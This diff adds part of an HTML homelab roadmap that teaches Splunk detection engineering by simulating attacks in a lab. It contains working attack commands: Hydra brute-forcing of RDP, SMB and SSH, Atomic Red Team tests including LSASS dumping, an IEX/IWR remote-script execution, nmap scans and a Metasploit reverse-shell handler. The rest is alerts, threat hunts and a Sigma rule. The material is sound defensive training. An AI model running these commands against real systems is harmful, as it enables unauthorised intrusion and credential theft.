+      <div class="phase-desc">Run controlled attacks from Kali Linux and Atomic Red Team to generate realistic telemetry for detection.</div>
+      <div class="phase-time">⏱ Week 3–4 · Ongoing</div>
+    </div>
+  </div>
+  <div class="steps">
+
+    <div class="step">
+      <div class="step-header" onclick="toggle(this)">
+        <span class="step-num">4.1</span>
+        <span class="step-title">Brute Force Attack — Hydra via Kali</span>
+        <span class="step-arrow">▾</span>
+      </div>
+      <div class="step-body">
+        <div class="step-section">
+          <h4>Run the Attack (from Kali — 192.168.10.50)</h4>
+          <div class="code-block">
+<span class="cmt"># Brute force RDP on Windows target</span>
+<span class="cmd">hydra -l jsmith -P /usr/share/wordlists/rockyou.txt rdp://192.168.10.30</span>
+
+<span class="cmt"># Brute force SMB on Domain Controller</span>
+<span class="cmd">hydra -l Administrator -P /usr/share/wordlists/rockyou.txt smb://192.168.10.20</span>
+
+<span class="cmt"># SSH brute force on Ubuntu</span>
+<span class="cmd">hydra -l ubuntu -P /usr/share/wordlists/rockyou.txt ssh://192.168.10.40</span>
+          </div>
+        </div>
+        <div class="step-section">
+          <h4>Detect in Splunk — Look for Event ID 4625 (Failed Logons)</h4>
+          <div class="spl">
+index=endpoint EventCode=<span class="val">4625</span>
+<span class="pipe">| stats</span> count by Account_Name, IpAddress, _time
+<span class="pipe">| where</span> count > <span class="val">5</span>
+<span class="pipe">| sort</span> -count
+          </div>
+          <div class="spl">
+<span class="cmt"># After brute force succeeds — spot the successful logon</span>
+index=endpoint EventCode=<span class="val">4624</span> Account_Name=jsmith
+<span class="pipe">| table</span> _time, host, Account_Name, Logon_Type, IpAddress
+          </div>
+        </div>
+        <div class="note">⚠ Look for 50+ failed EventCode 4625 in rapid succession from a single source IP — that's your brute force fingerprint. Followed by a 4624 = successful compromise.</div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header" onclick="toggle(this)">
+        <span class="step-num">4.2</span>
+        <span class="step-title">Atomic Red Team — MITRE ATT&CK Simulations</span>
+        <span class="step-arrow">▾</span>
+      </div>
+      <div class="step-body">
+        <div class="step-section">
+          <h4>Install Atomic Red Team (Windows Target — PowerShell as Admin)</h4>
+          <div class="code-block">
+<span class="cmt"># Set execution policy</span>
+<span class="cmd">Set-ExecutionPolicy Bypass -Scope CurrentUser -Force</span>
+
+<span class="cmt"># Install NuGet and the Invoke-AtomicRedTeam module</span>
+<span class="cmd">Install-PackageProvider -Name NuGet -Force</span>
+<span class="cmd">Install-Module -Name invoke-atomicredteam,powershell-yaml -Force</span>
+<span class="cmd">Import-Module invoke-atomicredteam</span>
+
+<span class="cmt"># Download the atomic test definitions</span>
+<span class="cmd">IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)</span>
+<span class="cmd">Install-AtomicRedTeam -getAtomics</span>
+          </div>
+        </div>
+        <div class="step-section">
+          <h4>Run Key MITRE ATT&CK Techniques</h4>
+          <div class="code-block">
+<span class="cmt"># T1136.001 — Persistence: Create Local Account</span>
+<span class="cmd">Invoke-AtomicTest T1136.001</span>
+
+<span class="cmt"># T1059.001 — Execution: PowerShell (encoded command)</span>
+<span class="cmd">Invoke-AtomicTest T1059.001</span>
+
+<span class="cmt"># T1003.001 — Credential Access: LSASS Memory Dump</span>
+<span class="cmd">Invoke-AtomicTest T1003.001</span>
+
+<span class="cmt"># T1053.005 — Persistence: Scheduled Task</span>
+<span class="cmd">Invoke-AtomicTest T1053.005</span>
+
+<span class="cmt"># T1197 — BITS Jobs (LOLBin technique)</span>
+<span class="cmd">Invoke-AtomicTest T1197</span>
+
+<span class="cmt"># Always clean up after each test</span>
+<span class="cmd">Invoke-AtomicTest T1136.001 -Cleanup</span>
+          </div>
+        </div>
+        <div class="step-section">
+          <h4>Detect T1059.001 (Encoded PowerShell) in Splunk</h4>
+          <div class="spl">
+index=endpoint sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational
+EventCode=<span class="val">1</span> Image="*powershell.exe"
+(CommandLine="*-EncodedCommand*" OR CommandLine="*FromBase64String*")
+<span class="pipe">| table</span> _time, host, User, CommandLine, ParentImage
+          </div>
+        </div>
+        <div class="step-section">
+          <h4>Detect T1003.001 (Credential Dumping / LSASS) in Splunk</h4>
+          <div class="spl">
+index=endpoint sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational
+EventCode=<span class="val">10</span> TargetImage="*lsass.exe"
+<span class="pipe">| table</span> _time, host, SourceImage, GrantedAccess, User
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header" onclick="toggle(this)">
+        <span class="step-num">4.3</span>
+        <span class="step-title">Network Reconnaissance & Port Scanning</span>
+        <span class="step-arrow">▾</span>
+      </div>
+      <div class="step-body">
+        <div class="step-section">
+          <h4>Nmap Scan from Kali</h4>
+          <div class="code-block">
+<span class="cmt"># Full port scan of entire lab subnet</span>
+<span class="cmd">nmap -sV -sC -O 192.168.10.0/24 -oN lab_scan.txt</span>
+
+<span class="cmt"># Aggressive scan of Windows target</span>
+<span class="cmd">nmap -A -T4 192.168.10.30</span>
+          </div>
+        </div>
+        <div class="step-section">
+          <h4>Detect Network Scan in Splunk (Sysmon Event ID 3)</h4>
+          <div class="spl">
+index=endpoint EventCode=<span class="val">3</span>
+<span class="pipe">| stats</span> dc(DestinationPort) as unique_ports, count by SourceIp, DestinationIp
+<span class="pipe">| where</span> unique_ports > <span class="val">20</span>
+<span class="pipe">| sort</span> -unique_ports
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header" onclick="toggle(this)">
+        <span class="step-num">4.4</span>
+        <span class="step-title">Metasploit Exploitation Simulation</span>
+        <span class="step-arrow">▾</span>
+      </div>
+      <div class="step-body">
+        <div class="step-section">
+          <h4>From Kali — EternalBlue / Meterpreter (Lab Only)</h4>
+          <div class="code-block">
+<span class="cmt"># Start Metasploit</span>
+<span class="cmd">msfconsole</span>
+
+<span class="cmt"># Use a simple payload for detection testing</span>
+<span class="kw">use</span> exploit/multi/handler
+<span class="kw">set</span> payload windows/x64/meterpreter/reverse_tcp
+<span class="kw">set</span> LHOST <span class="str">192.168.10.50</span>
+<span class="kw">set</span> LPORT <span class="str">4444</span>
+<span class="kw">run</span>
+
+<span class="cmt"># Transfer and run a staged payload on Windows target</span>
+<span class="cmt"># This generates Sysmon Event ID 1, 3, and 11</span>
+          </div>
+        </div>
+        <div class="step-section">
+          <h4>Detect Reverse Shell Beacon in Splunk</h4>
+          <div class="spl">
+index=endpoint EventCode=<span class="val">3</span>
+DestinationIp=<span class="val">192.168.10.50</span> DestinationPort=<span class="val">4444</span>
+<span class="pipe">| table</span> _time, host, Image, SourceIp, DestinationIp, DestinationPort
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- PHASE 5 -->
+<div class="phase phase-color-5">
+  <div class="phase-header">
+    <div class="phase-num">05</div>
+    <div class="phase-meta">
+      <div class="phase-tag">Detection Engineering</div>
+      <div class="phase-title">Alerts, Dashboards & SOC Workflows</div>
+      <div class="phase-desc">Build detection rules, custom dashboards, and practice real SOC analyst workflows end-to-end.</div>
+      <div class="phase-time">⏱ Week 4–6 · Core SOC Skills</div>
+    </div>
+  </div>
+  <div class="steps">
+
+    <div class="step">
+      <div class="step-header" onclick="toggle(this)">
+        <span class="step-num">5.1</span>
+        <span class="step-title">Build Alert Rules (Saved Searches)</span>
+        <span class="step-arrow">▾</span>
+      </div>
+      <div class="step-body">
+        <div class="step-section">
+          <h4>Alert 1 — Brute Force Detection (Account Lockout Threshold)</h4>
+          <div class="spl">
+index=endpoint EventCode=<span class="val">4625</span>
+<span class="pipe">| bucket</span> _time span=<span class="val">5m</span>
+<span class="pipe">| stats</span> count by Account_Name, IpAddress, _time
+<span class="pipe">| where</span> count > <span class="val">10</span>
+          </div>
+          <p style="font-size:12px;color:var(--muted);margin-top:8px">Save as Alert → Trigger: count > 10 → Action: Send Email / Slack webhook</p>
+        </div>
+        <div class="step-section">
+          <h4>Alert 2 — New Admin Account Created (Persistence)</h4>
+          <div class="spl">
+index=endpoint (EventCode=<span class="val">4720</span> OR EventCode=<span class="val">4728</span>)
+<span class="pipe">| table</span> _time, host, Subject_Account_Name, Target_Account_Name, Group_Name
+          </div>
+        </div>
+        <div class="step-section">
+          <h4>Alert 3 — PowerShell Encoded Command Execution</h4>
+          <div class="spl">
+index=endpoint EventCode=<span class="val">1</span>
+CommandLine="*-EncodedCommand*" OR CommandLine="*-enc *"
+<span class="pipe">| table</span> _time, host, User, ParentCommandLine, CommandLine
+          </div>
+        </div>
+        <div class="step-section">
+          <h4>Alert 4 — Suspicious Scheduled Task Creation</h4>
+          <div class="spl">
+index=endpoint EventCode=<span class="val">4698</span>
+<span class="pipe">| rex</span> field=Message <span class="str">"Task Name:\s+(?&lt;task_name&gt;[^\n]+)"</span>
+<span class="pipe">| table</span> _time, host, User, task_name, Message
+          </div>
+        </div>
+        <div class="step-section">
+          <h4>Alert 5 — LSASS Access (Credential Dumping)</h4>
+          <div class="spl">
+index=endpoint EventCode=<span class="val">10</span>
+TargetImage="*\\lsass.exe"
+GrantedAccess IN (<span class="val">"0x1010"</span>, <span class="val">"0x1410"</span>, <span class="val">"0x147a"</span>)
+<span class="pipe">| table</span> _time, host, SourceImage, TargetImage, GrantedAccess, User
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header" onclick="toggle(this)">
+        <span class="step-num">5.2</span>
+        <span class="step-title">Build SOC Dashboard in Splunk</span>
+        <span class="step-arrow">▾</span>
+      </div>
+      <div class="step-body">
+        <div class="step-section">
+          <h4>Recommended Panels for Your SOC Dashboard</h4>
+          <ul class="bullets">
+            <li><strong>Failed Logins Over Time</strong> — Line chart, EventCode 4625, last 24h</li>
+            <li><strong>Top Attacking IPs</strong> — Bar chart, top 10 source IPs by failed login count</li>
+            <li><strong>Active Hosts Reporting</strong> — Single value tile, unique hosts in last 1h</li>
+            <li><strong>Process Creation by User</strong> — Table, EventCode 1, top suspicious commands</li>
+            <li><strong>Network Connections Map</strong> — EventCode 3, source→dest pairs, port filter</li>
+            <li><strong>Recent Alerts Fired</strong> — Table of last 20 triggered alerts with severity</li>
+            <li><strong>Log Volume Over Time</strong> — Area chart, index=endpoint, by sourcetype</li>
+            <li><strong>MITRE ATT&CK Coverage</strong> — Use Splunk Security Essentials heat map</li>
+          </ul>
+        </div>
+        <div class="step-section">
+          <h4>Create Dashboard: Dashboards → Create New Dashboard → Classic</h4>
+          <div class="code-block">
+<span class="cmt"># Each panel is a saved search visualized</span>
+<span class="cmt"># Dashboard XML can be exported for version control</span>
+<span class="cmt"># Use drilldown to link panels — click IP → filter all panels</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header" onclick="toggle(this)">
+        <span class="step-num">5.3</span>
+        <span class="step-title">Practice Incident Response Workflow</span>
+        <span class="step-arrow">▾</span>
+      </div>
+      <div class="step-body">
+        <div class="step-section">
+          <h4>SOC Analyst Investigation Checklist (per Alert)</h4>
+          <ul class="bullets">
+            <li><strong>Triage:</strong> Is this alert a true positive, false positive, or benign? Check context</li>
+            <li><strong>Scope:</strong> Which host? Which user? What time window? Single event or pattern?</li>
+            <li><strong>Pivot:</strong> From the host, search all events around the same time ±15 minutes</li>
+            <li><strong>Process Tree:</strong> Use Sysmon Event ID 1 to trace parent→child process chain</li>
+            <li><strong>Network:</strong> Did the compromised host make outbound connections? (Event ID 3)</li>
+            <li><strong>Persistence:</strong> Were scheduled tasks, registry keys, or new accounts created?</li>
+            <li><strong>Lateral Movement:</strong> Did the attacker log into other hosts? Check Event ID 4624/4648</li>
+            <li><strong>Document:</strong> Write up a mock incident report with timeline, IOCs, and remediation</li>
+          </ul>
+        </div>
+        <div class="step-section">
+          <h4>SPL — Full Investigation Pivot from a Suspicious Host</h4>
+          <div class="spl">
+index=endpoint host=<span class="val">WIN-TARGET</span>
+earliest=<span class="val">-1h</span> latest=<span class="val">now</span>
+<span class="pipe">| eval</span> event_type=case(EventCode=<span class="val">1</span>,<span class="val">"Process"</span>,EventCode=<span class="val">3</span>,<span class="val">"Network"</span>,EventCode=<span class="val">4625</span>,<span class="val">"FailedLogon"</span>,<span class="val">1=1</span>,<span class="val">"Other"</span>)
+<span class="pipe">| stats</span> count by event_type, User, EventCode
+<span class="pipe">| sort</span> -count
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header" onclick="toggle(this)">
+        <span class="step-num">5.4</span>
+        <span class="step-title">Map Detections to MITRE ATT&CK</span>
+        <span class="step-arrow">▾</span>
+      </div>
+      <div class="step-body">
+        <ul class="bullets">
+          <li>Open <strong>Splunk Security Essentials</strong> app → Security Content → Browse all use cases</li>
+          <li>Each detection is tagged with <strong>ATT&CK Tactic + Technique ID</strong> (e.g., T1059.001)</li>
+          <li>Filter by "Implemented" vs "Not Implemented" to track your coverage</li>
+          <li>Use the <strong>ATT&CK Heat Map</strong> panel to visualize which tactics you can detect</li>
+          <li>Goal: build coverage across Initial Access, Execution, Persistence, Privilege Escalation, Credential Access, and Lateral Movement</li>
+        </ul>
+        <div class="info">💡 Reference: attack.mitre.org — every technique has a "Detection" section with Splunk search ideas and data sources needed.</div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- PHASE 6 -->
+<div class="phase phase-color-6">
+  <div class="phase-header">
+    <div class="phase-num">06</div>
+    <div class="phase-meta">
+      <div class="phase-tag">Advanced & Expansion</div>
+      <div class="phase-title">Threat Hunting, Tuning & Lab Expansion</div>
+      <div class="phase-desc">Graduate from reactive alerting to proactive threat hunting, reduce false positives, and add advanced data sources.</div>
+      <div class="phase-time">⏱ Week 6+ · Advanced Level</div>
+    </div>
+  </div>
+  <div class="steps">
+
+    <div class="step">
+      <div class="step-header" onclick="toggle(this)">
+        <span class="step-num">6.1</span>
+        <span class="step-title">Threat Hunting with SPL</span>
+        <span class="step-arrow">▾</span>
+      </div>
+      <div class="step-body">
+        <div class="step-section">
+          <h4>Hunt 1 — Living off the Land Binaries (LOLBins)</h4>
+          <div class="spl">
+index=endpoint EventCode=<span class="val">1</span>
+Image IN (<span class="val">"*\\certutil.exe"</span>, <span class="val">"*\\bitsadmin.exe"</span>, <span class="val">"*\\mshta.exe"</span>,
+          <span class="val">"*\\regsvr32.exe"</span>, <span class="val">"*\\rundll32.exe"</span>, <span class="val">"*\\wmic.exe"</span>)
+<span class="pipe">| stats</span> count by Image, CommandLine, User, host
+<span class="pipe">| sort</span> -count
+          </div>
+        </div>
+        <div class="step-section">
+          <h4>Hunt 2 — Rare Parent-Child Process Pairs (Anomalous Execution)</h4>
+          <div class="spl">
+index=endpoint EventCode=<span class="val">1</span>
+ParentImage="*\\winword.exe" OR ParentImage="*\\excel.exe"
+<span class="pipe">| stats</span> count by ParentImage, Image, CommandLine, host
+<span class="pipe">| where</span> count < <span class="val">5</span>
+          </div>
+        </div>
+        <div class="step-section">
+          <h4>Hunt 3 — DNS Beaconing (C2 Indicators)</h4>
+          <div class="spl">
+index=endpoint EventCode=<span class="val">22</span>
+<span class="pipe">| bucket</span> _time span=<span class="val">1h</span>
+<span class="pipe">| stats</span> count by QueryName, _time, host
+<span class="pipe">| stats</span> stdev(count) as stddev, avg(count) as avg_count by QueryName
+<span class="pipe">| where</span> stddev < <span class="val">2</span> AND avg_count > <span class="val">10</span>
+<span class="pipe">| sort</span> stddev
+          </div>
+        </div>
+        <div class="step-section">
+          <h4>Hunt 4 — Long-Running Processes with Network Activity</h4>
+          <div class="spl">
+index=endpoint EventCode=<span class="val">3</span>
+<span class="pipe">| stats</span> dc(DestinationIp) as unique_ips, sum(bytes_out) as total_bytes by Image, host
+<span class="pipe">| where</span> unique_ips > <span class="val">50</span> OR total_bytes > <span class="val">1000000</span>
+<span class="pipe">| sort</span> -unique_ips
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header" onclick="toggle(this)">
+        <span class="step-num">6.2</span>
+        <span class="step-title">Tune Alerts — Reduce False Positives</span>
+        <span class="step-arrow">▾</span>
+      </div>
+      <div class="step-body">
+        <ul class="bullets">
+          <li>Add <strong>allowlists</strong> to searches: `NOT User IN ("SYSTEM", "LOCAL SERVICE", "NETWORK SERVICE")`</li>
+          <li>Tune Sysmon config — add `onmatch="exclude"` filters for known benign processes in SwiftOnSecurity XML</li>
+          <li>Use <strong>lookup tables</strong> in Splunk to whitelist known-good hashes, IPs, and domains</li>
+          <li>Track false positive rate: every alert fired should be reviewed and documented</li>
+          <li>Adjust alert <strong>thresholds</strong> based on your lab's baseline noise levels</li>
+        </ul>
+        <div class="code-block">
+<span class="cmt"># Create a whitelist lookup table</span>
+<span class="cmt"># Settings → Lookups → Lookup Table Files → Upload: whitelist_processes.csv</span>
+<span class="cmt"># Then in SPL:</span>
+<span class="cmd">| lookup whitelist_processes.csv Image as Image OUTPUT is_whitelisted</span>
+<span class="cmd">| where</span> NOT is_whitelisted=<span class="str">"true"</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header" onclick="toggle(this)">
+        <span class="step-num">6.3</span>
+        <span class="step-title">Add pfSense Firewall & Network Logs</span>
+        <span class="step-arrow">▾</span>
+      </div>
+      <div class="step-body">
+        <ul class="bullets">
+          <li>Add a <strong>pfSense VM</strong> as the network gateway for your lab — it replaces the simple NAT</li>
+          <li>Configure pfSense to forward firewall logs to Splunk via syslog (UDP 514)</li>
+          <li>Install <strong>Splunk Add-on for pfSense</strong> for proper field extraction</li>
+          <li>Now you can detect: port scans, blocked outbound connections, C2 traffic patterns, DNS over alternative ports</li>
+          <li>Layer with Sysmon + Windows Security logs for full kill-chain visibility</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header" onclick="toggle(this)">
+        <span class="step-num">6.4</span>
+        <span class="step-title">Sigma Rules & Detection Engineering</span>
+        <span class="step-arrow">▾</span>
+      </div>
+      <div class="step-body">
+        <ul class="bullets">
+          <li><strong>Sigma</strong> is a generic YAML-based detection rule format — vendor agnostic, community-maintained</li>
+          <li>Convert Sigma rules to SPL using <strong>pySigma</strong> with the Splunk backend</li>
+          <li>Repository: github.com/SigmaHQ/sigma — thousands of production-grade rules</li>
+          <li>Write your own Sigma rule for every attack you successfully simulate, then convert it to a Splunk alert</li>
+        </ul>
+        <div class="code-block">
+<span class="cmt"># Install pySigma</span>
+<span class="cmd">pip install pysigma pysigma-backend-splunk pysigma-pipeline-sysmon</span>
+
+<span class="cmt"># Convert a Sigma rule to SPL</span>
+<span class="cmd">sigma convert -t splunk -p sysmon sigma_rule.yml</span>
+        </div>
+        <div class="step-section">
+          <h4>Example Sigma Rule — Encoded PowerShell</h4>
+          <div class="code-block">
+title: Suspicious Encoded PowerShell
+id: <span class="str">abc123</span>
+status: experimental
+logsource:
+  product: windows
+  service: sysmon
+detection:
+  selection:
+    EventID: <span class="kw">1</span>
+    Image|endswith: <span class="str">'\powershell.exe'</span>
+    CommandLine|contains:
+      - <span class="str">'-EncodedCommand'</span>
+      - <span class="str">'FromBase64String'</span>
+  condition: selection
+level: high
+tags:
+  - attack.execution
+  - attack.t1059.001
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header" onclick="toggle(this)">
+        <span class="step-num">6.5</span>
+        <span class="step-title">Document Everything & Build a Portfolio</span>
+        <span class="step-arrow">▾</span>
+      </div>
+      <div class="step-body">
+        <ul class="bullets">
+          <li><strong>GitHub repo</strong> — commit all your SPL queries, Sigma rules, Sysmon configs, and dashboard JSON</li>
+          <li><strong>Incident reports</strong> — write one for each attack you simulated and detected. Format: Summary → Timeline → IOCs → Detection → Remediation</li>
+          <li><strong>Screenshots</strong> — document Splunk dashboards, alert firings, and investigation pivots</li>
+          <li><strong>Blog posts / writeups</strong> — publish on Medium, GitHub Pages, or personal site for visibility</li>
+          <li><strong>LinkedIn</strong> — share your homelab journey with the community. Recruiters actively search for this</li>
+        </ul>
+        <div class="info">💡 A well-documented homelab with real GitHub evidence is worth more than most certifications in a SOC Analyst interview. Show your process, not just your results.</div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header" onclick="toggle(this)">
+        <span class="step-num">6.6</span>
+        <span class="step-title">Certifications to Complement This Lab</span>
+        <span class="step-arrow">▾</span>
+      </div>
+      <div class="step-body">
+        <ul class="bullets">
+          <li><strong>Splunk Core Certified User (SPLK-1001)</strong> — validates your SPL and dashboard skills. Free study: docs.splunk.com</li>
+          <li><strong>CompTIA Security+</strong> — broad security fundamentals, well-recognized for entry-level SOC roles</li>
+          <li><strong>CompTIA CySA+</strong> — directly aligned with SOC Analyst Tier 2 duties</li>
+          <li><strong>BTL1 (Blue Team Labs Level 1)</strong> — hands-on, practical exam aligned exactly with this homelab</li>
+          <li><strong>TryHackMe SOC Level 1 & 2 paths</strong> — free/cheap, Splunk-specific rooms for guided practice</li>
+        </ul>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+</div><!-- /phases -->
+
+<div style="text-align:center;padding:40px;color:var(--muted);font-family:var(--mono);font-size:11px;border-top:1px solid var(--border)">
+  SOC Homelab Roadmap · Splunk SIEM · Researched & compiled 2025
+</div>
+
+<script>
+function toggle(header){
+  const step = header.parentElement;
+  step.classList.toggle('open');
+}
+</script>
+</body>
+</html>
